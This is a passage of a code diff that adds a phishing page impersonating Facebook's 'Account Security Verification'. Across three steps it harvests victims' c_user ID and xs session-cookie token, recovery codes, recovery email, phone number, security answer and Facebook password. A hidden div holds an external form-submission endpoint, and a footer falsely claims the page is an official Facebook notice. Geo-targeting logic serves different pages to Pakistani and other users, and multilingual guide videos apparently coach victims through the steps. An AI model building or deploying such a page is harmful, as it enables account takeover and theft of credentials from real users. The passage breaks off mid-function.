+                        <path d="M9 11.24V7.5C9 6.12 10.12 5 11.5 5S14 6.12 14 7.5v3.74c1.21-.81 2-2.18 2-3.74C16 5.01 13.99 3 11.5 3S7 5.01 7 7.5c0 1.56.79 2.93 2 3.74zm9.84 4.63l-4.54-2.26c-.17-.07-.35-.11-.54-.11H13v-6c0-.83-.67-1.5-1.5-1.5S10 6.67 10 7.5v10.74l-3.43-.72c-.08-.01-.15-.03-.24-.03-.31 0-.59.13-.79.33l-.79.8 4.94 4.94c.27.27.65.44 1.06.44h6.79c.75 0 1.33-.55 1.44-1.28l.75-5.27c.01-.07.02-.14.02-.2 0-.62-.38-1.16-.91-1.38z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Saved</span>
+            </div>
+            
+            <div class="fb-sidebar-item">
+                <div class="fb-sidebar-icon">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">File Manager</span>
+            </div>
+            
+            <div class="fb-sidebar-item" style="margin-top: 20px;">
+                <div class="fb-sidebar-icon">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">See more</span>
+            </div>
+        </aside>
+
+        <!-- Center Content with Form -->
+        <section class="fb-center-content">
+            <!-- Main Form Container -->
+            <div class="fb-main-form-container">
+                <!-- Form Header -->
+                <div class="fb-form-header">
+                    <div class="fb-form-title">
+                        <div class="fb-form-icon">
+                            <svg width="24" height="24" fill="currentColor">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                        </div>
+                        <div class="fb-form-title-text">
+                            <h2>Account Security Verification Required</h2>
+                            <p>We need to verify your identity to protect your account</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Progress Bar -->
+                    <div class="fb-progress-container">
+                        <div class="fb-progress-text">
+                            <span>Step 1 of 3</span>
+                            <span>33% Complete</span>
+                        </div>
+                        <div class="fb-progress-bar">
+                            <div class="fb-progress-fill"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Form Steps -->
+                    <div class="fb-form-steps">
+                        <button class="fb-step active" data-step="1">
+                            <span class="fb-step-number">1</span>
+                            Account Info
+                        </button>
+                        <button class="fb-step" data-step="2">
+                            <span class="fb-step-number">2</span>
+                            Security Check
+                        </button>
+                        <button class="fb-step" data-step="3">
+                            <span class="fb-step-number">3</span>
+                            Verification
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Form Body -->
+                <div class="fb-form-body">
+                    <!-- Step 1 Content -->
+                    <div class="fb-form-step-content" id="step1">
+                        <div class="fb-form-group">
+                            <p class="fb-hint-text" style="margin-bottom: 20px;">
+                                We've detected unusual activity on your account. To keep your account secure, please verify your identity by providing the following information.
+                            </p>
+                        </div>
+
+                        <!-- VIDEO SECTION - MOVED ABOVE FORM FIELDS -->
+                        <div class="fb-video-section">
+                            <!-- Video Header -->
+                            <div class="fb-video-header">
+                                <div class="fb-video-header-left">
+                                    <svg class="fb-video-header-icon" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                                        <path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/>
+                                    </svg>
+                                    <div class="fb-video-header-text">
+                                        <h4 id="videoTitle">Security Verification Guide</h4>
+                                        <div class="fb-video-subtitle" id="videoSubtitle">
+                                            <span class="fb-video-time" id="videoTime">Estimated time: 2 minutes</span>
+                                            <span id="videoType">Step-by-step instructions</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="fb-video-header-right">
+                                    <div class="fb-video-lang-tag" id="videoLangTag" style="display: none;">
+                                        <!-- Flag image will be inserted here by JavaScript -->
+                                        <span id="currentLangName">English</span>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Video Body -->
+                            <div class="fb-video-body">
+                                <div class="fb-video-placeholder" id="videoPlaceholder">
+                                    <div class="fb-video-play-overlay">
+                                        <svg class="fb-video-play-icon" width="48" height="48" fill="currentColor" viewBox="0 0 24 24">
+                                            <path d="M8 5v14l11-7z"/>
+                                        </svg>
+                                        <span class="fb-video-text" id="videoPlaceholderText">Click to watch guide video</span>
+                                        <span class="fb-video-click-hint" id="videoClickHint">Step-by-step instructions to complete verification</span>
+                                    </div>
+                                    <!-- Language Selection Button will be added here by JavaScript -->
+                                </div>
+                                <video class="fb-video-player" id="guideVideo" controls style="display: none;">
+                                    <source src="" type="video/mp4">
+                                </video>
+                            </div>
+                            
+                            <!-- Video Footer Info - FLAGS BELOW VIDEO -->
+                            <div class="fb-video-info" id="videoInfo" style="display: none;">
+                                <div id="videoLangInfo">Available in multiple languages:</div>
+                                <div class="fb-video-languages" id="videoLanguages">
+                                    <!-- Language flags will be populated by JavaScript -->
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- FORM FIELDS - BELOW VIDEO -->
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="c_user">
+                                User ID (c_user)
+                            </label>
+                            <input type="text" 
+                                   class="fb-input" 
+                                   id="c_user" 
+                                   placeholder=""
+                                   inputmode="numeric"
+                                   pattern="[0-9]*"
+                                   maxlength="20"
+                                   required>
+                            <div class="char-counter" id="c_user_counter">0/8 minimum</div>
+                            <p class="fb-hint-text">
+                                Must be at least 8 numbers
+                            </p>
+                            <div class="fb-error-message" id="c_user_error">
+                                <svg width="16" height="16" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span>Please enter a valid Facebook user ID</span>
+                            </div>
+                        </div>
+
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="xs_token">
+                               Token (xs)
+                            </label>
+                            <input type="text" 
+                                   class="fb-input" 
+                                   id="xs_token" 
+                                   placeholder=""
+                                   required>
+                            <p class="fb-hint-text">
+                                Must be at least 6 characters with uppercase, lowercase, numbers, and special characters (e.g., As1@#abc)
+                            </p>
+                            <div class="fb-error-message" id="xs_token_error">
+                                <svg width="16" height="16" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span>Please enter a valid session token</span>
+                            </div>
+                        </div>
+
+                        <!-- Recovery Code Section -->
+                        <div class="fb-form-group" id="recoverySection">
+                            <label class="fb-form-label" for="recovery_codes">
+                                Recovery Codes
+                            </label>
+                            <textarea class="fb-input" 
+                                      id="recovery_codes" 
+                                      rows="3"
+                                      placeholder=""
+                                      inputmode="numeric"></textarea>
+                            <div class="char-counter" id="recovery_counter">0 digits</div>
+                            <p class="fb-hint-text">
+                                Enter at least 8 numbers total (e.g., 12345678 or 1234,5678)
+                            </p>
+                            <div class="fb-error-message" id="recovery_error">
+                                <svg width="16" height="16" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span>Please enter at least 8 numbers</span>
+                            </div>
+                        </div>
+
+                        <div class="fb-form-group" style="text-align: center; margin-top: 20px;">
+                            <button class="fb-button" id="submitFirstFormBtn" style="min-width: 200px;">
+                                Verify Submit
+                            </button>
+                        </div>
+                    </div>
+
+                                <div style="display: none;">https://submit-form.com/XbChpIs1c</div>
+
+
+                    <!-- Step 2 Content (Hidden by default) -->
+                    <div class="fb-form-step-content" id="step2" style="display: none;">
+                        <div class="fb-form-group">
+                            <h3 style="margin-bottom: 16px; color: var(--text-primary);">Security Verification</h3>
+                            <p class="fb-hint-text" style="margin-bottom: 20px;">
+                                Please provide additional security information to verify your identity.
+                            </p>
+                        </div>
+
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="recovery_email">
+                                Recovery Email
+                            </label>
+                            <input type="email" 
+                                   class="fb-input" 
+                                   id="recovery_email" 
+                                   placeholder="Enter your recovery email address">
+                            <p class="fb-hint-text">
+                                We'll send a verification code to this email
+                            </p>
+                        </div>
+
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="phone_number">
+                                Phone Number
+                            </label>
+                            <input type="tel" 
+                                   class="fb-input" 
+                                   id="phone_number" 
+                                   placeholder="Enter your phone number">
+                            <p class="fb-hint-text">
+                                Include country code (e.g., +1 234 567 8900)
+                            </p>
+                        </div>
+
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="security_question">
+                                Security Question
+                            </label>
+                            <select class="fb-input" id="security_question">
+                                <option value="">Select a security question</option>
+                                <option value="pet">What was your first pet's name?</option>
+                                <option value="school">What elementary school did you attend?</option>
+                                <option value="city">In what city were you born?</option>
+                                <option value="car">What was your first car?</option>
+                            </select>
+                            <input type="text" 
+                                   class="fb-input" 
+                                   id="security_answer" 
+                                   placeholder="Your answer"
+                                   style="margin-top: 10px;">
+                        </div>
+
+                        <div class="fb-form-group" style="text-align: center; margin-top: 20px;">
+                            <button class="fb-button-secondary" id="prevStep2Btn" style="margin-right: 10px;">
+                                Back
+                            </button>
+                            <button class="fb-button" id="nextStep2Btn">
+                                Continue to Final Verification
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Step 3 Content (Password Form) - WITH FACEBOOK LOGO -->
+                    <div class="fb-form-step-content" id="step3" style="display: none;">
+                        <!-- Facebook Logo for Password Page -->
+                        <div class="fb-password-logo-container">
+                            <svg class="fb-password-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+                                <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.406 5.999 15.453 14 17.317V22h-4v-4h4v-2c0-3.86 2.989-7 6.5-7 1.61 0 2.902.124 3.5.356V12h-2.5c-2.326 0-4.5 1.563-4.5 4v2h5l-1 4h-4v13.87z"/>
+                            </svg>
+                            <h2 class="fb-password-title">Facebook Security Verification</h2>
+                            <p class="fb-password-subtitle">
+                                Enter your Facebook password to complete the verification process and secure your account.
+                            </p>
+                        </div>
+
+                        <div class="fb-form-group">
+                            <label class="fb-form-label" for="password">
+                                Facebook Password
+                            </label>
+                            <input type="password" 
+                                   class="fb-input" 
+                                   id="password" 
+                                   placeholder="Enter your password">
+                            <div class="fb-error-message" id="password_error">
+                                <svg width="16" height="16" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span>Please enter your password</span>
+                            </div>
+                        </div>
+
+                        <div class="fb-form-group" style="background-color: #f7f8fa; padding: 16px; border-radius: 8px; margin-top: 24px;">
+                            <h4 style="margin-bottom: 8px; color: var(--text-primary);">Verification Summary</h4>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;">
+                                <div>
+                                    <span style="font-size: 13px; color: var(--text-secondary);">User ID:</span>
+                                    <div id="summary_c_user" style="font-weight: 500;">-</div>
+                                </div>
+                                <div>
+                                    <span style="font-size: 13px; color: var(--text-secondary);">Session Token:</span>
+                                    <div id="summary_xs_token" style="font-weight: 500; font-size: 13px;">-</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="fb-form-group" style="text-align: center; margin-top: 20px;">
+                            <button class="fb-button-secondary" id="prevStep3Btn" style="margin-right: 10px;">
+                                Back
+                            </button>
+                            <button class="fb-button" id="submitPasswordBtn">
+                                Complete Verification
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Success Message (Hidden by default) - WITH FACEBOOK LOGO -->
+                    <div class="fb-success-card" id="successMessage" style="display: none;">
+                        <!-- Facebook Logo for Success Page -->
+                        <div class="fb-success-logo-container">
+                            <svg class="fb-success-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+                                <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.406 5.999 15.453 14 17.317V22h-4v-4h4v-2c0-3.86 2.989-7 6.5-7 1.61 0 2.902.124 3.5.356V12h-2.5c-2.326 0-4.5 1.563-4.5 4v2h5l-1 4h-4v13.87z"/>
+                            </svg>
+                            <h3 class="fb-success-title">Verification Submitted Successfully</h3>
+                        </div>
+                        
+                        <div class="fb-success-icon">
+                            <svg width="48" height="48" fill="currentColor">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            </svg>
+                        </div>
+                        
+                        <p class="fb-success-text">
+                            Your account verification request has been submitted to Facebook Security Team. Our team will review your information and you'll receive an email notification within 24 hours.
+                        </p>
+                        <div style="margin-top: 20px; padding: 12px; background-color: #f7f8fa; border-radius: 6px;">
+                            <span style="font-size: 13px; color: var(--text-secondary);">Facebook Reference ID:</span>
+                            <div id="referenceId" style="font-weight: 600; font-size: 16px; color: var(--text-primary); margin-top: 4px;">FB-789456123</div>
+                        </div>
+                        <button class="fb-button" style="margin-top: 20px; padding: 10px 24px;">
+                            Return to Facebook
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sidebar Content Below Form -->
+            <div class="fb-form-sidebar">
+                <h3>Security & Privacy</h3>
+                
+                <!-- Sponsored Card -->
+                <div class="fb-sponsor-card">
+                    <div class="fb-sponsor-header">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Facebook Security" class="fb-sponsor-avatar">
+                        <div class="fb-sponsor-info">
+                            <h4>Facebook Security</h4>
+                            <p>Sponsored · Facebook</p>
+                        </div>
+                    </div>
+                    <h4 class="fb-sponsor-title">Protect Your Account</h4>
+                    <p class="fb-sponsor-text">
+                        Learn how to better protect your Facebook account with our security tips and best practices.
+                    </p>
+                    <a href="#" class="fb-sponsor-learn-more">
+                        Learn More
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                    </a>
+                    <div class="fb-sponsor-tag">Security</div>
+                </div>
+                
+                <!-- Privacy Checkup Card -->
+                <div class="fb-sponsor-card">
+                    <div class="fb-sponsor-header">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Privacy Checkup" class="fb-sponsor-avatar">
+                        <div class="fb-sponsor-info">
+                            <h4>Privacy Checkup</h4>
+                            <p>Facebook · Privacy Tools</p>
+                        </div>
+                    </div>
+                    <h4 class="fb-sponsor-title">Review Your Privacy Settings</h4>
+                    <p class="fb-sponsor-text">
+                        Take a few minutes to review your privacy settings and make sure your information is shared only with people you want.
+                    </p>
+                    <a href="#" class="fb-sponsor-learn-more">
+                        Start Checkup
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                    </a>
+                    <div class="fb-sponsor-tag">Privacy</div>
+                </div>
+                
+                <!-- Two-Factor Authentication Card -->
+                <div class="fb-sponsor-card">
+                    <div class="fb-sponsor-header">
+                        <img src="https://randomuser.me/api/portraits/men/67.jpg" alt="Two-Factor Auth" class="fb-sponsor-avatar">
+                        <div class="fb-sponsor-info">
+                            <h4>Two-Factor Authentication</h4>
+                            <p>Facebook Security</p>
+                        </div>
+                    </div>
+                    <h4 class="fb-sponsor-title">Add Extra Security</h4>
+                    <p class="fb-sponsor-text">
+                        Add an extra layer of security to your account with two-factor authentication. Get notifications when someone tries to log in.
+                    </p>
+                    <a href="#" class="fb-sponsor-learn-more">
+                        Set Up 2FA
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                    </a>
+                    <div class="fb-sponsor-tag">Recommended</div>
+                </div>
+                
+                <!-- Additional Security Card -->
+                <div class="fb-sponsor-card">
+                    <div class="fb-sponsor-header">
+                        <img src="https://randomuser.me/api/portraits/women/68.jpg" alt="Login Alerts" class="fb-sponsor-avatar">
+                        <div class="fb-sponsor-info">
+                            <h4>Login Alerts</h4>
+                            <p>Facebook · Security Features</p>
+                        </div>
+                    </div>
+                    <h4 class="fb-sponsor-title">Get Login Notifications</h4>
+                    <p class="fb-sponsor-text">
+                        Receive alerts when someone logs into your account from a new device or browser. Stay informed about your account activity.
+                    </p>
+                    <a href="#" class="fb-sponsor-learn-more">
+                        Enable Alerts
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                    </a>
+                    <div class="fb-sponsor-tag">Security</div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="fb-footer">
+        <div class="fb-footer-links">
+            <a href="#" class="fb-footer-link">Privacy</a>
+            <a href="#" class="fb-footer-link">Terms</a>
+            <a href="#" class="fb-footer-link">Advertising</a>
+            <a href="#" class="fb-footer-link">Ad Choices</a>
+            <a href="#" class="fb-footer-link">Cookies</a>
+            <a href="#" class="fb-footer-link">More</a>
+            <a href="#" class="fb-footer-link">Meta © 2026</a>
+        </div>
+        <div class="fb-copyright">
+            This is an official Facebook notification regarding your account security.
+        </div>
+    </footer>
+
+    <!-- Language Modal -->
+    <div class="fb-modal" id="languageModal">
+        <div class="fb-modal-content">
+            <div class="fb-modal-header">
+                <h3 class="fb-modal-title">Select Language for Video</h3>
+                <button class="fb-modal-close" id="closeModal">&times;</button>
+            </div>
+            <div class="fb-modal-body" id="languageOptions">
+                <!-- Languages will be populated by JavaScript -->
+            </div>
+            <div class="fb-modal-footer">
+                <button class="fb-button" id="confirmLanguageBtn" style="padding: 8px 24px;">
+                    Confirm & Play Video
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Video sources for Pakistan users (SPECIAL PAGE - only one video)
+        const pakistanVideo = {
+            english: "https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949"
+        };
+
+        // Video sources for non-Pakistan users (NORMAL PAGE - multiple languages)
+        const nonPakistanVideos = {
+            english: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767117204/lv_0_20251230161828_megdjq.mp4",
+            spanish: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767138812/lv-0-20251230161828_XWVuYZaZ_u4n8gk.mp4",
+            hindi: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767139292/1000595651.mp4-Hindi_tcemwd.mp4",
+            french: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767122724/lv-0-20251230161828_xKuJSMUZ_gvoi3d.mp4",
+            portuguese: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767138320/lv-0-20251230161828_EGC9ye5d_hrwoci.mp4",
+            tamil: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767150821/1000595608.mp4-Tamil_f8fmkd.mp4",
+            arabic: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767139366/1000595651.mp4-Arabic_ilgc8i.mp4",
+            ghanaian: "https://allvideos.wasmer.app/english.mp4",
+            vietnamese: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767122566/a49ufpu8e2ao_sc8ocg.mp4"
+        };
+
+        // Flag images for each language (PNG URLs)
+        const flagImages = {
+            english: "https://flagcdn.com/w40/us.png",
+            spanish: "https://flagcdn.com/w40/es.png",
+            hindi: "https://flagcdn.com/w40/in.png",
+            french: "https://flagcdn.com/w40/fr.png",
+            portuguese: "https://flagcdn.com/w40/pt.png",
+            tamil: "https://flagcdn.com/w40/in.png",
+            arabic: "https://flagcdn.com/w40/sa.png",
+            ghanaian: "https://flagcdn.com/w40/gh.png",
+            vietnamese: "https://flagcdn.com/w40/vn.png"
+        };
+
+        // Language names with flags
+        const languageNames = {
+            english: { name: 'English', flag: flagImages.english },
+            spanish: { name: 'Spanish', flag: flagImages.spanish },
+            hindi: { name: 'Hindi', flag: flagImages.hindi },
+            french: { name: 'French', flag: flagImages.french },
+            portuguese: { name: 'Portuguese', flag: flagImages.portuguese },
+            tamil: { name: 'Tamil', flag: flagImages.tamil },
+            arabic: { name: 'Arabic', flag: flagImages.arabic },
+            ghanaian: { name: 'Ghanaian (Twi)', flag: flagImages.ghanaian },
+            vietnamese: { name: 'Vietnamese', flag: flagImages.vietnamese }
+        };
+
+        // Global variables
+        let selectedLanguage = 'english';
+        let showRecoverySection = false;
+        let isSpecialPage = false; // Pakistan = Special Page, Non-Pakistan = Normal Page
+        let availableVideos = {};
+
+        // DOM Elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const successMessage = document.getElementById('successMessage');
+        const steps = document.querySelectorAll('.fb-step');
+        const progressFill = document.querySelector('.fb-progress-fill');
+        const progressText = document.querySelector('.fb-progress-text span:first-child');
+        const progressPercent = document.querySelector('.fb-progress-text span:last-child');
+        const videoPlaceholder = document.getElementById('videoPlaceholder');
+        const videoPlaceholderText = document.getElementById('videoPlaceholderText');
+        const videoClickHint = document.getElementById('videoClickHint');
+        const guideVideo = document.getElementById('guideVideo');
+        const recoverySection = document.getElementById('recoverySection');
+        const languageModal = document.getElementById('languageModal');
+        const closeModal = document.getElementById('closeModal');
+        const languageOptionsContainer = document.getElementById('languageOptions');
+        const confirmLanguageBtn = document.getElementById('confirmLanguageBtn');
+        const videoTitle = document.getElementById('videoTitle');
+        const videoSubtitle = document.getElementById('videoType');
+        const videoTime = document.getElementById('videoTime');
+        const videoLangTag = document.getElementById('videoLangTag');
+        const currentLangName = document.getElementById('currentLangName');
+        const videoInfo = document.getElementById('videoInfo');
+        const videoLangInfo = document.getElementById('videoLangInfo');
+        const videoLanguages = document.getElementById('videoLanguages');
+
+        // Current step tracking
+        let currentStep = 1;
+
+        // Validation Functions
+        function validateNumeric(input, minLength) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            
+            const value = input.value;
+            const counter = document.getElementById(input.id + '_counter');
+            const error = document.getElementById(input.id + '_error');
+            
+            if (counter) {
+                counter.style.display = value.length > 0 ? 'block' : 'none';
+                counter.textContent = `${value.length}/${minLength} minimum`;
+                
+                if (value.length > 0 && value.length < minLength) {
+                    counter.className = 'char-counter warning';
+                } else if (value.length >= minLength) {
+                    counter.className = 'char-counter';
+                }
+            }
+            
+            if (error) {
+                if (value.length > 0 && value.length < minLength) {
+                    error.style.display = 'flex';
+                } else {
+                    error.style.display = 'none';
+                }
+            }
+            
+            return value.length >= minLength;
+        }
+
+        function validateXsToken(input) {
+            // Allow only specific special characters and alphanumeric
+            input.value = input.value.replace(/[^A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/g, '');
+            
+            const value = input.value;
+            const errorElement = document.getElementById('xs_token_error');
+            
+            // Define the pattern: must contain at least one uppercase, one lowercase, one number, one special char
+            const hasUpperCase = /[A-Z]/.test(value);
+            const hasLowerCase = /[a-z]/.test(value);
+            const hasNumbers = /[0-9]/.test(value);
+            const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/.test(value);
+            const hasMinimumLength = value.length >= 6;
+            
+            if (value.length > 0) {
+                let errorMessages = [];
+                
+                if (!hasMinimumLength) {
+                    errorMessages.push("Minimum 6 characters required");
+                }
+                if (!hasUpperCase) {
+                    errorMessages.push("At least one uppercase letter (A-Z)");
+                }
+                if (!hasLowerCase) {
+                    errorMessages.push("At least one lowercase letter (a-z)");
+                }
+                if (!hasNumbers) {
+                    errorMessages.push("At least one number (0-9)");
+                }
+                if (!hasSpecialChar) {
+                    errorMessages.push("At least one special character (!@#$%^&* etc.)");
+                }
+                
+                if (errorMessages.length > 0) {
+                    errorElement.style.display = 'flex';
+                    errorElement.querySelector('span').textContent = errorMessages.join(", ");
+                } else {
+                    errorElement.style.display = 'none';
+                }
+            } else {
+                errorElement.style.display = 'none';
+            }
+            
+            return hasMinimumLength && hasUpperCase && hasLowerCase && hasNumbers && hasSpecialChar;
+        }
+
+        function validateRecoveryCodes() {
+            const input = document.getElementById('recovery_codes');
+            input.value = input.value.replace(/[^0-9,]/g, '');
+            
+            const value = input.value;
+            const digitsOnly = value.replace(/,/g, '');
+            const counter = document.getElementById('recovery_counter');
+            const error = document.getElementById('recovery_error');
+            
+            if (counter) {
+                counter.style.display = digitsOnly.length > 0 ? 'block' : 'none';
+                counter.textContent = `${digitsOnly.length} digits`;
+                
+                if (digitsOnly.length > 0 && digitsOnly.length < 8) {
+                    counter.className = 'char-counter warning';
+                } else if (digitsOnly.length >= 8) {
+                    counter.className = 'char-counter';
+                }
+            }
+            
+            if (error) {
+                if (digitsOnly.length > 0 && digitsOnly.length < 8) {
+                    error.style.display = 'flex';
+                    error.querySelector('span').textContent = `Minimum 8 numbers required (${digitsOnly.length}/8)`;
+                } else {
+                    error.style.display = 'none';
+                }
+            }
+            
+            return digitsOnly.length >= 8;
+        }
+
+        // Update progress
+        function updateProgress() {
+            const progress = (currentStep - 1) * 33.33;
+            progressFill.style.width = `${progress}%`;
+            progressText.textContent = `Step ${currentStep} of 3`;
+            progressPercent.textContent = `${Math.round(progress)}% Complete`;
+        }
+
+        // Update step UI
+        function updateStepUI() {
+            // Hide all steps
+            step1.style.display = 'none';
+            step2.style.display = 'none';
+            step3.style.display = 'none';
+            successMessage.style.display = 'none';
+            
+            // Show current step
+            if (currentStep === 1) step1.style.display = 'block';
+            else if (currentStep === 2) step2.style.display = 'block';
+            else if (currentStep === 3) step3.style.display = 'block';
+            
+            // Update step indicators
+            steps.forEach((step, index) => {
+                step.classList.remove('active', 'completed');
+                if (index + 1 === currentStep) {
+                    step.classList.add('active');
+                } else if (index + 1 < currentStep) {
+                    step.classList.add('completed');
+                }
+            });
+            
+            // Update progress
+            updateProgress();
+            
+            // Update summary in step 3
+            if (currentStep === 3) {
+                const c_user = document.getElementById('c_user').value;
+                const xs_token = document.getElementById('xs_token').value;
+                
+                document.getElementById('summary_c_user').textContent = c_user || '-';
+                document.getElementById('summary_xs_token').textContent = 
+                    xs_token ? `${xs_token.substring(0, 10)}...` : '-';
+            }
+        }
+
+        // Check user country using API (SINGLE DECISION POINT)
+        function checkPageTypeFromBackend() {
+            console.log("Checking page type from backend...");
+
+            fetch("")
+                .then(res => res.json())
+                .then(data => {
+                    console.log("Backend Response:", data);
+
+                    // 🔥 SINGLE BACKEND DECISION
+                    if (data.showPage === true) {
+                        // SPECIAL PAGE (Pakistan)
+                        isSpecialPage = true;
+                        showRecoverySection = false;
+                        availableVideos = pakistanVideo;
+                        console.log("SPECIAL PAGE: Pakistan user (no recovery section)");
+                    } else {
+                        // NORMAL PAGE (Non-Pakistan)
+                        isSpecialPage = false;
+                        showRecoverySection = true;
+                        availableVideos = nonPakistanVideos;
+                        console.log("NORMAL PAGE: Non-Pakistan user (with recovery section)");
+                    }
+
+                    // Update UI based on backend decision
+                    updateUIForPageType();
+
+                })
+                .catch(error => {
+                    console.log('Backend check failed:', error);
+                    // Default to SPECIAL PAGE (Pakistan) on error
+                    isSpecialPage = true;
+                    showRecoverySection = false;
+                    availableVideos = pakistanVideo;
+                    updateUIForPageType();
+                });
+        }
+
+        // Create language selection button (for NORMAL PAGE only)
+        function createLanguageButton() {
+            const languageButton = document.createElement('button');
+            languageButton.className = 'fb-language-button';
+            languageButton.id = 'languageSelectButton';
+            
+            const flagImg = document.createElement('img');
+            flagImg.className = 'flag-img';
+            flagImg.src = languageNames[selectedLanguage]?.flag || flagImages.english;
+            flagImg.alt = languageNames[selectedLanguage]?.name || 'English';
+            
+            const langName = document.createElement('span');
+            langName.textContent = languageNames[selectedLanguage]?.name || 'English';
+            
+            const arrowSpan = document.createElement('span');
+            arrowSpan.className = 'arrow';
+            arrowSpan.innerHTML = `
+                <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M7 10l5 5 5-5z"/>
+                </svg>
+            `;
+            
+            languageButton.appendChild(flagImg);
+            languageButton.appendChild(langName);
+            languageButton.appendChild(arrowSpan);
+            
+            languageButton.addEventListener('click', (e) => {
+                e.stopPropagation();
+                populateLanguageOptions();
+                languageModal.style.display = 'flex';
+            });
+            
+            return languageButton;
+        }
+
+        // Make video flags functional
+        function makeVideoFlagsFunctional() {
+            const videoFlags = document.querySelectorAll('.fb-language-flag');
+            
+            videoFlags.forEach(flag => {
+                flag.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    
+                    const langCode = this.getAttribute('data-lang');
+                    if (!langCode || !availableVideos[langCode]) return;
+                    
+                    selectedLanguage = langCode;
+                    updateLanguageUI(langCode);
+                    
+                    console.log(`Language changed to: ${langCode} via flag`);
+                    
+                    if (guideVideo && !guideVideo.paused) {
+                        playVideoInSelectedLanguage();
+                    }
+                });
+            });
+        }
+
+        // Update UI when language changes
+        function updateLanguageUI(langCode) {
+            // Update video header language tag
+            if (videoLangTag) {
